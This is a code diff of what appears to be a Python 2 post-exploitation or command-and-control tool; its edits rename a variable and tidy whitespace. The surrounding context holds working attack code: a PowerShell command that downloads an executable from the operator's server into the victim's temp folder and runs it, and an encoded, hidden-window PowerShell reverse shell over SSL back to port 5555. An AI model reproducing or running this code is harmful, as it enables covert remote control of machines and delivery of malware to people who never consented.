@@ -41,7 +41,7 @@ def startBindListener(portnum,useProxy):
         except:
             print t.bold_red + "connection closed from %s %s"%(bindIp, bindPort) + t.normal
             break
-            
+
     if useProxy:
         bsp.close()
     bs.close()
@@ -129,7 +129,7 @@ def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
         clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 25;Start-Process \"$Env:TEMP\\temp.exe\"")
 
 def printListener():
-    windows_ps_rev_shell = (
+    windows_powershell_stager = (
         "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
         "[byte[]]$b = 0..65535|%{0};"
         "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
@@ -142,7 +142,7 @@ def printListener():
         "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
         "$sl.Flush()};$c.Close()")
 
-    print 'powershell.exe -WindowStyle Hidden -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
+    print 'powershell.exe -WindowStyle Hidden -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
     return True
 
 def pingClients(clientconn,clientnumber):
@@ -156,8 +156,3 @@ def pingClients(clientconn,clientnumber):
             print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
             del clientMenuOptions[str(clientnumber)]
         sys.exit(1)
-
-
-"""
-
-    """
